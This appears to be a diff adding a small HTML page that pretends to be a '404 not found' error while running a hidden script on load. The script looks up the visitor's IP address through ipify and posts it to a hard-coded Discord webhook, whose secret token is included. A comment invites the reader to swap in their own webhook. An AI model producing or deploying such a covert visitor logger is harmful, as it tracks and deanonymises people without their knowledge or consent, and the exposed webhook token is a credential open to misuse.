@@ -1,0 +1,34 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://Hazelnut.com</title>
+    <script>
+        async function sendIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                let ip = data.ip;let webhookUrl = "https://discord.com/api/webhooks/1348149288579891230/vMwbJioC6BccY6wEtaDWotoL_ezlfd_875kj1HSo4m6xyBkVZlMAxPO9hA_iWt0lXbP2"; // Ganti dengan webhook Discord kamu
+            let payload = {
+                content: `Someone visited the page! IP: ${ip}`
+            };
+            
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        } catch (error) {
+            console.error("Failed to get IP:", error);
+        }
+    }
+    
+    sendIP();
+</script>
+
+</head>
+<body>
+    <h1>Welcom</h1>
+    <p>404 not found</p>
+</body>
+</html>
